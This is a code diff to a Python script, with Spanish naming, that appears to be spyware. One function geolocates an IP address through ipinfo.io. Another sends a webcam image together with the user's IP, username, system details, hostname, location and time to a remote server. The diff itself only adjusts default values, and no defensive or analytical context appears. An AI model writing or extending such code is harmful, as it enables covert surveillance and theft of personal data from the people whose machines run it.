@@ -48,10 +48,10 @@ def obtener_geolocalizacion(ip):
         res = requests.get(f"https://ipinfo.io/{ip}/json")
         data = res.json()
         return {
-            "ciudad": data.get("city"),
-            "region": data.get("region"),
-            "pais": data.get("country"),
-            "loc": data.get("loc")
+            "ciudad": data.get("city", "N/A"),
+            "region": data.get("region", "N/A"),
+            "pais": data.get("country", "N/A"),
+            "loc": data.get("loc", "N/A")
         }
     except:
         return {}
@@ -75,15 +75,15 @@ def enviar_al_servidor(info, archivos):
         with open(archivos["webcam"], "rb") as img_file:
             files = {"image": img_file}
             data = {
-                "ip": info.get("ip", "No recibido"),
-                "username": info.get("username", "No recibido"),
-                "system_info": info.get("system_info", "No recibido"),
-                "hostname": info.get("hostname", "N/A"),
-                "ciudad": info.get("ciudad", "N/A"),
-                "region": info.get("region", "N/A"),
-                "pais": info.get("pais", "N/A"),
-                "loc": info.get("loc", "N/A"),
-                "hora": info.get("hora", "N/A")
+                "ip": info.get("ip"),
+                "username": info.get("username"),
+                "system_info": info.get("system_info"),
+                "hostname": info.get("hostname"),
+                "hora": info.get("hora"),
+                "ciudad": info.get("ciudad"),
+                "region": info.get("region"),
+                "pais": info.get("pais"),
+                "loc": info.get("loc")
             }
             print("[*] Enviando al servidor...")
             print("  Payload:", data)
